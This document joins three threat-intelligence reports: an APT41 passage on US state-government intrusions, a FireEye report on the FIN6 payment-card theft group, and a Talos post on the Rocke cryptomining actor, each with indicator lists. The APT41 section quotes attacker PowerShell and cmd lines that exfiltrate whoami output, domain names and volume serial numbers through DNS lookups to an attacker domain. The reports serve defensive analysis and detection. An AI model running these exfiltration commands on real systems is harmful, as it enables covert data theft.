Another technique APT41 used to launch malware is through the addition of a malicious import to the Import Address Table (IAT) of legitimate Windows PE binaries.
As a result, once the legitimate binary is executed, it will load the malicious library and call its DllEntryPoint.
A modified IAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11.
Modified IAT (CFF Explorer)
Figure 11: Modified IAT (CFF Explorer)
APT41 continues to tailor their malware to victim environments through their stealthy passive backdoor LOWKEY.PASSIVE.
During one intrusion, APT41 exploited a USAHerds server and subsequently executed DEADEYE.APPEND which dropped LOWKEY.PASSIVE in-memory.
The identified LOWKEY.PASSIVE sample listened for incoming connections that request either of the following URL endpoints:

http://<HOST:PORT>/USAHerds/Common/%s.css 
https://<HOST:PORT>/USAHerds/Common/%s.css
APT41 frequently configured LOWKEY.PASSIVE URL endpoints to masquerade as normal web application traffic on an infected server.
“It’s Always Cloudy in Chengdu” — Cloudflare Usage
APT41 has substantially increased their usage of Cloudflare services for C2 communications and data exfiltration.
Specifically, APT41 leveraged Cloudflare Workers to deploy serverless code accessible through the Cloudflare CDN which helps proxy C2 traffic to APT41 operated infrastructure.
At multiple victims, APT41 issued ping commands where the output of a reconnaissance command was prepended to subdomains of Cloudflare proxied infrastructure.
Once the ping command was executed, the local DNS resolver attempted to resolve the fabricated domain containing the prepended command output.
The forward DNS lookup eventually reached the primary domain's Cloudflare name servers, which were unable to resolve an IP address for the fabricated domain.
However, the DNS activity logs of the attacker-controlled domain recorded the DNS lookup of the subdomain, allowing the group to collect the reconnaissance command output.
Examples of this technique can be seen in Figure 12 to Figure 15.
Figure 12: Reconnaissance Exfiltration
$a=whoami;ping ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($a)).replace('-','')+""[.]ns[.]time12[.]cf"")
Figure 13: Reconnaissance Exfiltration
cmd.exe /c ping %userdomain%[.]ns[.]time12[.]cf
In Figure 14, APT41 issued a command to find the volume serial number of the system, which has historically been used as the decryption key for DEADEYE payloads.
Figure 14: Volume Serial Number Exfiltration
ping -n 1 ((cmd /c dir c:\|findstr Number).split()[-1]+'.ns[.]time12[.]cf
In this last example, the command prints the length of the file syslog_6-1.dat, likely to ensure it has been fully written to disk prior to combining the multiple files into the full malicious executable.
Figure 15: File Size Exfiltration
ping -n 1 ((ls C:\Users\public\syslog_6-1.dat).Length.ToString()+"".ns[.]time12[.]cf"")
APT41 leveraged the aforementioned technique for further data exfiltration by hex encoding PII data and prepending the results as subdomains of the attacker-controlled domain.
The resulting DNS lookups triggered by the ping commands would be recorded in the activity logs and available to APT41.
APT41’s continued usage of Cloudflare services is further exemplified in recently developed KEYPLUG samples.
Mandiant identified a unique capability added to KEYPLUG that leverages the WebSocket over TLS (WSS) protocol for C2 communication.
According to Cloudflare, WebSocket traffic can be established through the Cloudflare CDN edge servers, which will proxy data through to the specified origin server.
KEYPLUG includes a hardcoded one-byte XOR encoded configuration file that lists the specific communication protocol, servers, and additional settings.
After KEYPLUG decodes the hardcoded configuration file at runtime, it will parse the configuration to determine the appropriate network protocol and servers to use for command and control.
After the configuration is parsed, KEYPLUG randomly chooses a CIDR block from the list then randomly chooses an IP address within the CIDR block based on the current tick count of the infected computer.
Figure 16 details an example configuration file identified during a recent U.S.
state government intrusion.
Figure 16: KEYPLUG Configuration
WSS://104.24.0.0/14;103.22.200.0/22;103.21.244.0/22:443|7600|5|1|afdentry.workstation.eu.org:443
The CIDR blocks listed in Figure 16 are Cloudflare CDN associated infrastructure that will redirect the WSS connection to the malicious domain afdentry[.]workstation[.]eu[.]org.
Figure 17 is an example HTTP request sent by KEYPLUG to initiate and upgrade to the WSS protocol using Cloudflare infrastructure.
KEYPLUG HTTP Upgrade Request
Figure 17: KEYPLUG HTTP Upgrade Request
We notified Cloudflare of this malicious activity and they took prompt action to disrupt communications to the malicious infrastructure.
APT41’s increased usage of Cloudflare services indicates a desire to leverage Cloudflare’s flexibility and deter identification and blocking of their true C2 servers.
Outlook
APT41's recent activity against U.S.
state governments consists of significant new capabilities, from new attack vectors to post-compromise tools and techniques.
APT41 can quickly adapt their initial access techniques by re-compromising an environment through a different vector, or by rapidly operationalizing a fresh vulnerability.
The group also demonstrates a willingness to retool and deploy capabilities through new attack vectors as opposed to holding onto them for future use.
APT41 exploiting Log4J in close proximity to the USAHerds campaign showed the group’s flexibility to continue targeting U.S state governments through both cultivated and co-opted attack vectors.
Through all the new, some things remain unchanged: APT41 continues to be undeterred by the U.S.
Department of Justice (DOJ) indictment in September 2020.
Indicators
Malware Family

MD5

SHA1

SHA256

KEYPLUG.LINUX

900ca3ee85dfc109baeed4888ccb5d39

355b3ff61db44d18003537be8496eb03536e300f

e024ccc4c72eb5813cc2b6db7975e4750337a1cc619d7339b21fdbb32d93fd85

KEYPLUG.LINUX

b82456963d04f44e83442b6393face47

996aa691bbc1250b571a2f5423a5d5e2da8317e6

d7e8cc6c19ceebf0e125c9f18b50167c0ee65294b3fce179fdab560e3e8e0192

DSQUERY

49f1daea8a115dd6fce51a1328d863cf

e85427af661fe5e853c8c9398dc46ddde50e2241

ebf28e56ae5873102b51da2cc49cbbe43192ca2f318c4dfc874448d9b85ebd00

DSQUERY

b108b28138b93ec4822e165b82e41c7a

7056b044f97e3e349e3e0183311bb44b0bc3464f

062a7399100454c7a523a938293bef7ddb0bc10636ed402be5f9797d8cc3c57e

BADPOTATO

143278845a3f5276a1dd5860e7488313

6f6b51e6c88e5252a2a117ca1cfb57934930166b

a4647fcb35c79f26354c34452e4a03a1e4e338a80b2c29db97bba4088a208ad0

Context

Indicator(s)

U.S.
State  Government Campaign – USAHerds (CVE-2021-44207) Exploitation

194[.]195[.]125[.]121

194[.]156[.]98[.]12 

54[.]248[.]110[.]45

45[.]153[.]231[.]31

185[.]118[.]167[.]40

104[.]18[.]6[.]251

104[.]18[.]7[.]251

20[.]121[.]42[.]11

34[.]139[.]13[.]46

54[.]80[.]67[.]241

149[.]28[.]15[.]152

18[.]118[.]56[.]237

107[.]172[.]210[.]69

172[.]104[.]206[.]48

67[.]205[.]132[.]162

45[.]84[.]1[.]181

cdn[.]ns[.]time12[.]cf

east[.]winsproxy[.]com

afdentry[.]workstation[.]eu[.]org

ns1[.]entrydns[.]eu[.]org

subnet[.]milli-seconds[.]com

work[.]viewdns[.]ml

work[.]queryip[.]cf

Log4j (CVE-2021-44228) Exploitation

103[.]238[.]225[.]37

182[.]239[.]92[.]31

microsoftfile[.]com

down-flash[.]com

libxqagv[.]ns[.]dns3[.]cf
FIREEYE THREAT INTELLIGENCE SPECIAL REPORT / APRIL 2016 FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 SS FC PAN FS NAME FS  Reports on payment card intrusions and theft are often fragmentary. The focus is on various pieces of the attack and less about capturing the end-to-end cycle of compromise, data theft, illicit sale and use. The full scope of attacker activity traditionally occurs beyond the view of any one group of investigators. Incident response teams may have visibility into the technical aspects of the breach itself, while cyber crime researchers monitor the movement and sale of stolen data in the criminal underground. FireEye Threat Intelligence and iSIGHT Partners recently combined our research to illuminate the activities of one particular threat group: FIN6. This combined insight has provided unique and extensive visibility into FIN6’s operations, from initial intrusion to the methods used to navigate the victims’ networks to the sale of the stolen payment card data in an underground marketplace.

In this report, we describe FIN6’s activities and tactics, techniques and procedures (TTPs), and provide a glimpse into the criminal ecosystem that supports the “payoff” for their operations. FIN6 is a cyber criminal group intent on stealing payment card data for monetization. In 2015, FireEye Threat Intelligence supported several Mandiant Consulting investigations in the hospitality and retail sectors where FIN6 actors had aggressively targeted and compromised pointof-sale (POS) systems, making off with millions of payment card numbers. Through iSIGHT, we learned that the payment card numbers stolen by FIN6 were sold on a “card shop” — an underground criminal marketplace used to sell or exchange payment card data. Figure 1 illustrates what we believe to be FIN6’s typical operational methodology. FIREEYE INTELLIGENCE TRACKS targeted Financial threats (known as “FIN” groups) capable of using a wide range of tools and tactics during their computer network intrusions. These groups employ a high level of planning, organization and task management to accomplish their goals.

The threat actors generally target a particular demographic or type of organization, and their goal is financial gain from the data they steal. They may profit through direct sale of stolen data (such as payment cards or personally identifiable information), unauthorized transfer of funds (such as with stolen bank account or bank routing credentials); or insider trading (based on the theft of nonpublic business information). It’s not entirely clear how FIN6 initially compromises victims. In Mandiant’s investigations, FIN6 already possessed valid credentials to each victim network and used those credentials to initiate further intrusion activity.1 In one case, GRABNEW malware was found on a victim computer that FIN6 later used in its operations. We suspect that the computer was originally compromised with GRABNEW by a separate threat actor, who used GRABNEW to capture valid user credentials. FIN6 may have obtained those credentials (through purchase or trade) and used them for its operations.

GAININGACCESS INDISCRIMINATE OR INTENTIONAL? FIN6’s use of GRABNEW, or credentials collected by GRABNEW, is not altogether surprising and possibly points to a cyber crime support ecosystem that opens doors to threat actors capable of lateral movement and more damaging activities. Previously, we observed another FIN group — FIN2 — leverage several existing Citadel compromises to deploy their custom tools and expand within a network to compromise payment card systems. Likewise, Proofpoint recently observed GRABNEW variants leading to downloads of POS malware known as AbaddonPOS. GRABNEW, ALSO KNOWN AS NEVERQUEST AND VAWTRAK, emerged around 2013 and since then has been consistently and indiscriminately spread through massive spam campaigns. We typically differentiate between threat actors who indiscriminately distribute malware and threat actors who use malware selectively. GRABNEW itself is a credential-stealing backdoor with form-grabbing capabilities and the ability to inject code into specific web pages to, for example, mimic a valid login prompt for a financial institution to facilitate banking fraud.

In some cases, the presence of GRABNEW malware has overlapped with the spread of POS malware such as PoSeidon, a variant of the Backoff POS malware. When investigating an intrusion, it may be challenging to determine the initial method of compromise — the means through which a threat group first gained access to a victim network. While in some cases evidence may point to a spear-phishing attack or exploit execution, in other cases little to no forensic evidence of the original compromise remains. All threat groups generally follow a broad operational framework known as the Attack Lifecycle. While the phases of the Attack Lifecycle — from initial compromise to privilege escalation to maintaining presence and completing the mission — are remarkably consistent, the specific TTPs used vary widely based on a group’s skills, motivations and ultimate goals. After gaining access with valid credentials, we observed FIN6 leveraging components of the Metasploit Framework to establish their foothoold.

For example, in one case, FIN6 used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener that would execute shellcode received over a specific port. Similarly, FIN6 used at least two downloaders called HARDTACK and SHIPBREAD (apparent variations on Metasploit payloads) to establish backdoor access to the compromised environment. Both of these tools are configured to connect to remote command and control (CnC) servers and download and execute shellcode. FIN6 generally used either registry run keys or Windows scheduled tasks in order to establish persistence for these tools. Once their accesses were established with preferred backdoors, FIN6 used additional public utilities such as Windows Credentials Editor for privilege escalation and credential harvesting. Additional privilege escalation tools exploited Microsoft Windows vulnerabilities in an attempt to compromise privileged account credentials on various hosts. The tools targeted CVE-2013-3660, CVE-2011-2005 and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.2 Continuing their use of Metasploit-related tools, FIN6 also used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the Active Directory database (ntds.dit).

Access to this file would allow them to extract password hashes from the file and crack them offline. FIN6 GETTING THE JOB DONE These vulnerabilities have all been patched by Microsoft; Windows systems with up-to-date software and security patches should not be exploitable. After locating POS systems within the target’s environment, FIN6 deployed POS malware that we call TRINITY. In addition to collecting credentials, FIN6 used publicly available tools to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers and NetBIOS. In particular, during the reconnaissance phase they gathered information on systems running SQL instances, dumping schemas for multiple databases and SQL user accounts. Specific tools used by FIN6 included Microsoft’s built-in SQL querying tool (osql.exe), Query Express (a free, portable graphical SQL client capable of connecting to Microsoft SQL and Oracle databases) and AdFind, a free command-line tool for querying Active Directory. Over the course of one day, for example, the group targeted more than 900 SQL servers to dump reconnaissance information to support further operations.

Capitalizing on the acquired reconnaissance data, FIN6 began lateral movement using credentials stolen from various systems on which they gathered usernames and password hashes. They likely cracked these hashes outside of the target’s network before using multiple sets of domain admin credentials in combination with remote command execution tools such as PsExec and Remote Command Executor (RemCom) throughout the rest of the lateral movement phase. To maintain presence and support interactive access in the environment, FIN6 leveraged the publicly available Plink command-line utility (part of the PuTTY SSH and Telnet suite) to create SSH tunnels to CnC servers under their control. As shown in Figure 2, they used these SSH tunnels to route Remote Desktop Protocol (RDP) traffic and allow for interactive RDP sessions with systems in the target network. After locating POS systems within the target’s environment, FIN6 deployed POS malware that we call TRINITY (also known as FrameworkPOS), with Scheduled Tasks being used for persistence.

TRINITY runs continuously and targets system processes not listed in its accompanying process blacklist, seeking data that matches payment card track data. Once the malware identifies track data, it copies and encodes it to a local file in a subdirectory of the c:\windows\ directory while attempting to conceal these files with .dll or .chm extensions. In one particular case — and as an example of scale — FIN6 compromised and deployed TRINITY on around 2,000 systems, resulting in millions of exposed cards. Finally, to move the stolen payment card data out of the environment, FIN6 used a script to systematically iterate through a list of compromised POS systems, copying the harvested track data files to a numbered “log” file before removing the original data files. They then compressed the log files into a ZIP archive and moved the archive through the environment to an intermediary system and then to a staging system.

From the staging system, they then copied the stolen data to external CnC servers under their control using the FTP command line utility. In another case, FIN6 used an alternative extraction method to upload payment card data to a public file sharing service. TRINITY IS POS MALWARE THAT ATTEMPTS TO LOCATE AND STEAL PAYMENT CARD DATA FROM MEMORY. The malware first creates mutexes named m_number3 and MuTex-Check and exits if either already exists. The malware then continuously iterates over the current process listing and examines the memory space of each process. Processes with module names less than five characters are skipped, along with some specific process names that are unlikely to contain payment card information. TRINITY logs captured data to disk, typically to a file in %WINDIR%\temp or %WINDIR%\help. The malware encodes the data with a simple substitution cipher and single-byte XOR using the OxAA key. Using iSIGHT Partners’ collected intelligence, we discovered that the stolen payment card data from these intrusions were sold in an underground card shop.

This particular shop is advertised on multiple underground cyber crime forums and has offered diverse criminals access to millions of stolen payment cards on a regular basis. This closes the loop on the “lifecycle” of cyber criminal activity and exemplifies one of the final stages of cyber crime actors monetizing their stolen data. We have identified stolen data from several of FIN6’s victims being sold by this vendor as far back as 2014. This connection means that data UNDERGROUND CARD SHOPS stolen by FIN6 has almost certainly ended up in the hands of fraud operators across the world, as they buy and exploit payment cards from the underground shop. In each case, the stolen data began appearing in the shop within six months of the FIN6 breach. While the amount of data sold through the shop varies by breach, in some cases more than 10 million cards associated with a specific FIN6-linked breach have been identified on the shop.

After being posted, much of the stolen card data is quickly purchased for exploitation. Along with the data we have linked to FIN6, this underground shop has sold data from millions of other cards, which may be linked to breaches perpetrated by other threat actors. Our analysis of the data sold through this underground vendor indicates that FIN6’s compromises are highly profitable to the actors involved, potentially resulting in extensive fraud losses. Our analysis of the data sold through this underground vendor indicates that FIN6’s compromises are highly profitable to the actors involved, potentially resulting in extensive fraud losses. For instance, in one FIN6-linked breach the vendor was advertising nearly than 20 million cards. These cards were predominantly from the United States and selling for an average of $21. So the total return for the shop — if all the data was sold at full price — could have been about $400 million.

In reality, the shop would typically only make a fraction of this figure since not all the data would be sold (laundering stolen cards is typically much harder than stealing them), buyers want the newest data they can get (data that has been on the shop for a while loses its value) and the shop offers discounts based on various criteria. Still, a fraction of $400 million is a significant sum. In turn, cyber criminals purchasing the data would expect to make more than they paid for the cards by conducting fraudulent transactions using those cards. Not all of the data sold on this particular card shop has been tied to an identified compromise or specific cyber criminal group. Additionally, as is often the case with prominent cyber criminal vendors, it is not yet clear how the operators of the underground site are linked to the actors who steal the data the shop sells.

The vendor has sold large amounts of card data with varied characteristics, so it is possible the shop operators maintain relationships with more than one data provider. FIN6 members could include some of the operators behind this shop; alternately, FIN6 could be selling stolen data to the operators of this site. UNDERGROUND COMMUNITIES DEALING IN STOLEN CARD DATA EXIST ACROSS THE world and are a major facilitator of money laundering operations. A large number of these communities take the form of illicit e-commerce sites called “card shops” or “dump shops” (criminals refer to stolen card-present transaction data as “dumps”). These shops allow their clientele to use a web-based platform to sort through data on thousands or millions of payment cards and purchase exactly the types they want based on their money laundering capabilities. These data are then added to the client’s cart for checkout, similar to a legitimate website. Subsequently, customers use the card information they have purchased for many different money laundering schemes, such as buying and reselling gift cards or electronics.

Good threat intelligence comes from a combination of factors. It requires visibility into the threat landscape, including both a broad view (the ability to identify activity across a range of countries, industries and organizations) and a deep view (the ability to gather detailed information about how threat actors operate). It also requires skilled analysts who are able to review, fuse and understand the available data. In this case, the combined intelligence from FireEye, Mandiant and iSIGHT intelligence teams was able to not only identify malicious activity aimed at stealing payment card data, but also provide a detailed window into that activity from compromise through monetization of the stolen data. The story of FIN6 shows how real-world threat actors operate, providing a glimpse not only into the technical details of the compromise, but also into the human factor as well; namely, the interactions between different criminals or criminal groups, and how it is not just data being bartered or sold in the underground, but also tools, credentials and access.

Summary
Cryptocurrency miners are becoming an increasingly significant part of the threat landscape. These malicious miners steal CPU cycles from compromised devices to mine cryptocurrencies and bring in income for the threat actor. In this post, we look at the activity of one particular threat actor: Rocke. We will examine several of Rocke's campaigns, malware, and infrastructure while uncovering more information about the actor. After months of research, we believe that Rocke is an actor that must be followed, as they continue to add new features to their malware and are actively exploring new attack vectors. Introduction
Talos has written widely about the issue of cryptomining malware and how organizations should protect systems against this threat. We continue to actively research developments in this threat through research that includes monitoring criminal forums and deploying honeypot systems to attract these threats. It is through these intelligence sources that the Chinese-speaking actor which we refer to as "Rocke" came to our attention.

Rocke actively engages in distributing and executing cyrptomining malware using a varied toolkit that includes Git repositories, HttpFileServers (HFS), and a myriad of different payloads, including shell scripts, JavaScript backdoors, as well as ELF and PE miners. Early campaigns
This threat actor initially came to our attention in April 2018, leveraging both Western and Chinese Git repositories to deliver malware to honeypot systems vulnerable to an Apache Struts vulnerability. Several files were downloaded to our Struts2 honeypot from the Chinese repository site gitee.com for a user named "c-999." Subsequently, the Gitee user page transitioned to "c-888." Around the same time, we observed similar activity pulling down files from a gitlab.com repository page for a user named "c-18."

The repositories on both Gitee and GitLab were identical. All the repositories had a folder called "ss" that contained 16 files. The files were a collection of ELF executables, shell scripts, and text files that execute a variety of actions, including achieving persistence and the execution of an illicit cryptocurrency miner.

Once the threat actor had compromised a system, they achieved persistence on the device by installing a cron job that downloads and executes a file "logo.jpg" from "3389[.]space." This file is a shell script which, in turn, downloads mining executables from the threat actor's Git repositories and saves them under the filename "java." The exact file downloaded depends on the victim's system architecture. Similarly, the system architecture determines if "h32" or "h64" is used to invoke "java."

Although we first observed this actor exploiting vulnerabilities in Apache Struts, we've also observed what we believe to the same individual exploiting an Oracle WebLogic server vulnerability (CVE-2017-10271), and also exploiting CVE-2017-3066, a critical Java deserialization vulnerability in the Adobe ColdFusion platform. Recent campaign
In late July, we became aware that the same actor was engaged in another similar campaign. Through our investigation into this new campaign, we were able to uncover more details about the actor.

We observed a wget request from our Struts2 honeypot for a file named "0720.bin" located on 118[.]24[.]150[.]172:10555. We visited this IP and found it was an open HFS hosting "0720.bin" along with 10 additional files: "3307.bin," "a7," "bashf," "bashg," "config.json," "lowerv2.sh," "pools.txt," "r88.sh," "rootv2.sh" and "TermsHost.exe." We set about examining these files. Screenshot of HFS system
We had previously observed this same IP scanning for TCP port 7001 throughout May 2018. This was potentially a scan for Oracle WebLogic servers, which listens on TCP port 7001 by default. Both "0720.bin" and "3307.bin" are similar ELF files of similar size (84.19KB) that reach out to 118[.]24[.]150[.]172, and were marked clean in VirusTotal at the time of discovery. Morpheus Labs described a similar file that connects to the same IP address, which could open a shell on the victim's machine if a password-verified instruction was issued from the C2. In both our samples, as well as the ones that Morpheus Labs described, the hard-coded password was not only identical, but also located at the same offset.

Hard-coded password
"A7" is a shell script that kills a variety of processes related to other cryptomining malware (including those with names matching popular mining malware such as "cranberry," "yam," or "kworker"), as well as mining in general (such as "minerd" and "cryptonight"). It detects and uninstalls various Chinese AV, and also downloads and extracts a tar.gz file from blog[.]sydwzl[.]cn, which also resolves to 118[.]24[.]150[.]172. The script downloads a file from GitHub called "libprocesshider," which hides a file called "x7" using the ID preloader. The script looks for IP addresses in known_hosts and attempts to SSH into them, before downloading "a7" again from the actor's HFS at 118[.]24[.]150[.]172, and execute it. Extract of Source Code of "a7"
"Config.json" is a mining config file for XMRig, an open-source Monero miner. The file sets the mining pool as xmr[.]pool[.]MinerGate[.]com:45700 and the actor's wallet as rocke@live.cn. This is why we have named the actor "Rocke" (note that for MinerGate, an email can be used in place of a Monero wallet number — it's simply the login email for the MinerGate platform).

"Pools.txt" appears to be a config file for XMR-stak, an open-source universal Stratum pool miner that mines Monero, Aeon and more. This configuration file contains the same actor pool and wallet information as the first. "Bashf" is a variant of XMR-stak while "bashg" is a variant of XMRig. "Lowerv2.sh" and "rootv2.sh" are similar shell scripts that attempt to download and execute the mining malware components "bashf" and "bashg," hosted on 118[.]24[.]150[.]172. If the shell scripts do not download a miner from 118[.]24[.]150[.]172, they attempt to download a file called "XbashY" from 3g2upl4pq6kufc4m[.]tk. "R88.sh" is a shell script that installs a cron job and attempts to download "lowerv2.sh" or "rootv2.sh."

"TermsHost.exe" is a PE32 Monero miner. Based on the config file it uses, it appears to be the Monero Silent Miner. This miner can be purchased online for $14 and targets malicious actors. Advertising for the miner promotes it as offering startup registry key persistence, mining only while idle, and the ability to inject the miner into "Windows processes to bypass firewalls." The sample grabs the config file "xmr.txt," which contains the same configuration information as the previous files, from Rocke's command and control (C2) server hosted on sydwzl[.]cn.

The sample then injects code into notepad.exe, which then proceeds to communicate with the MinerGate pool. The sample also creates the UPX-packed file "dDNLQrsBUE.url" in the Windows Start Menu Folder. Intriguingly, this file appears to share some similarities with Cobalt Strike, the popular penetration testing software, which would allow the attacker to have greater control over the infected system. The payload appears to be similar to one used by the Iron Cybercrime Group, as reported by cybersecurity firm Intezer in May. Both Iron and Rocke's malware behave similarly, and reach out to similar infrastructure. So, while we can asses with high confidence that the payloads share some code base, we are still unsure of the exact relationship between Rocke and Iron Cybercrime Group. The actor
Through Rocke's MinerGate Monero wallet email rocke@live.cn, we were able to uncover additional information about the actor. We noticed that Rocke's C2 was registered to the address jxci@vip.qq.com.

We then found a leak of user information from the Chinese security site FreeBuf that showed that a user named "rocke" was associated with the email jxci@vip.qq.com. This suggested that they were one in the same. [4]
Rocke has been observed seeking access to cloud storage services, as well as obtaining manuals for programming in the Chinese Easy language. The majority of websites registered to Rocke list Jiangxi Province addresses for their registration. Some of these websites were for Jiangxi-based businesses, such as belesu[.]com, which sells baby food. We had had additional indications that Rocke is from Jiangxi based on their GitHub (see below). It is possible that the "jx" in jxci@vip.qq.com stands for Jiangxi. Therefore, we assess with high confidence that Rocke operates from Jiangxi Province. The GitHub
We identified a GitHub page apparently associated with Rocke. The GitHub page lists Rocke as being affiliated with Jiangxi Normal University.

In one repository folder, we found several of the same files which were found on the HFS system, including several of the shell scripts with their wallet information included, as well as variants of the miner. We found additional repositories for the same account. Within these repositories, we found scripts similar to those found in previous campaigns, with the exception that they reached out to sydwzl[.]cn in addition to the previously observed domain 3389[.]space. These findings support the link between Rocke and the activity we previously observed in April and May. We also found an additional repository through Rocke's page that's hosting nearly identical content, but with a different C2. However, we are unable to determine how that page is being used or who is using it. The files within their various repositories show that Rocke has become interested in browser-based JavaScript mining through the tool CryptoNote, as well as browser-based exploitation through the Browser Exploitation Framework.

It appears that they are relying on fake Google Chrome alerts, fake apps, and fake Adobe Flash updates to social engineer users into downloading malicious payloads. One of the JavaScript files in the repository, named "command.js," uses hidden IFrames to deliver payloads hosted on CloudFront domains. The payload that we were able to obtain was UPX packed and behaved very similarly to the file "dDNLQrsBUE.url" dropped by "TermsHost.exe."

Rocke has also shown interest in other security-related repositories. They have forked repositories with exploit information, including those related to Apache Struts 2, JBoss and Shadow Brokers, as well as more general-use tools such as masscan, proxy tools and brute forcers. Conclusion
Based on their activity in the past few months, Talos assesses with high confidence that Rocke will continue to leverage Git repositories to download and execute illicit mining onto victim machines. It is interesting to note that they are expanding their toolset to include browser-based miners, difficult-to-detect trojans, and the Cobalt Strike malware.

Besides noisy scan-and-exploit activity, it appears that Rocke is likely also pursuing social engineering as a new infection vector, as demonstrated by the repositories involving fake Adobe Flash and Google Chrome updates. Despite the volatility in the value of various cryptocurrencies, the trend of illicit cryptocurrency mining activity among cybercriminals shows no signs of abating. Rocke's various campaigns show the variety of infection vectors, malware, and infrastructure that these criminals will employ to achieve their goals. IOCs:
Earlier campaign:
ATTACKING IPS TARGETING STRUTS:
52[.]167[.]219[.]168: Attacking IP using repo at gitlab
120[.]55[.]226[.]24: Attacking IP using repo at gitee

ATTACKING IP TARGETING WEBLOGIC:
27[.]193[.]180[.]224

ATTACKING IPS TARGETING COLDFUSION:
112[.]226[.]250[.]77
27[.]210[.]170[.]197
112[.]226[.]74[.]162

DOMAINS
3389[.]SPACE
URLS
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/A
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/CONFIG[.]JSON
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/DIR[.]DIR
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/H32
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/UPD
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/X86_64
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/H64
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/X
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/RUN
HXXPS://GITEE[.]COM/C-999/SS/RAW/MASTER/SS/LOGO[.]JPG
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/A
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/CRON[.]D
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/DIR[.]DIR
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/X
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/X86_64
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/RUN
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/UPD
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/UPD
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/X
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/CRON[.]D
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/H64
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/A
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/CONFIG[.]JSON
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/CONFIG[.]JSON
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/RUN
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/H32
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/DIR[.]DIR
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/X86_64
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/H32
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/H64
HXXP://93[.]174[.]93[.]149/[.]XXXZLOL[.]TAR[.]GZ
HXXPS://GITEE[.]COM/C-888/SS/RAW/MASTER/SS/LOGO[.]JPG
HXXPS://GITLAB[.]COM/C-18/SS/RAW/MASTER/SS/LOGO[.]JPG
HASHES:
LOGO.JPG: AD68AB153623472BBD8220FB19C488AE2884D9B52BC65ADD5D54B1821B4B743A
A: 6EC8201EF8652F7A9833E216B5ECE7EBBF70380EBD367E3385B1C0D4A43972FB
CRON.D: F6A150ACFA6EC9D73FDECAE27069026ECF2D833EAC89976289D6FA15713A84FE
DIR.DIR: A20D61C3D4E45413B001340AFB4F98533D73E80F3B47DAEC42435789D12E4027
H32: 45ED59D5B27D22567D91A65623D3B7F11726F55B497C383BC2D8D330E5E17161
H64: 7FE9D6D8B9390020862CA7DC9E69C1E2B676DB5898E4BFAD51D66250E9AF3EAF
logo.jpg (from gitee[.]com): f1f041c61e3086da8157745ee01c280a8238a379ca5b4cdbb25c5b746e490a9b

logo.jpg (from gitlab[.]com): ad68ab153623472bbd8220fb19c488ae2884d9b52bc65add5d54b1821b4b743a

run: 0c358d826c4a32a8c48ce88eb073f505b555fc62bca6015f5270425c58a0d1c5
upd: 187d06f1e6020b6787264e2e700c46c463a7818f07db0b051687f3cba65dbe0b
x (32-bit miner): 6e80a9d843faf27e239b1a767d29c7443972be1ddf5ff5f5f9fc9a2b55a161f5
x86_64 (64-bit miner): 2ad07f8d1985f00cd05dafacbe5b6a5b1e87a78f8ae8ecdf91c776651c88a612

More recent campaign:
IPS
123[.]249[.]9[.]149: ISSUES GET REQUEST FOR 0720.BIN
118[.]24[.]150[.]172: ROCKE'S HFS, ALSO RESOLVES TO C2 SYDWZL[.]CN
DOMAINS:
SYDWZL[.]CN
BLOCKBITCOIN[.]COM: REACHED OUT TO BY INSTALL.EXE
DAZQC4F140WTL[.]CLOUDFRONT[.]NET: FILE SERVER
3G2UPL4PQ6KUFC4M[.]TK: FILE SERVER
D3GOBOXON32GRK2L[.]TK: FILE SERVER
ENJOYTOPIC[.]TK: FILE SERVER
REALTIMENEWS[.]TK: FILE SERVER
8282[.]SPACE: OLDER C2
DOMAINS REGISTERED TO ROCKE (NOT ALL ARE NECESSARILY MALICIOUS):
5-xun[.]com
88180585[.]com
firstomato[.]com
jxtiewei[.]com
ncyypx[.]net

URLS
HXXP://D20BLZXLZ9YDHA[.]CLOUDFRONT[.]NET/INSTALL.EXE
HXXP://WWW[.]AMAZON[.]COM:80/N4215/ADJ/AMZN.US.SR.APS?SZ=160X600&OE=OE=ISO-8859-1;&SN=12275&S=3717&DC_REF=HTTP%3A%2F%2FWWW.AMAZON.COM
HXXP://WWW[.]AMAZON[.]COM:80/S/REF=NB_SB_NOSS_1/167-3294888-0262949/FIELD-KEYWORDS=BOOKS
HASHES
55DBDB84C40D9DC8C5AAF83226CA00A3395292CC8F884BDC523A44C2FD431C7B 0720.BIN
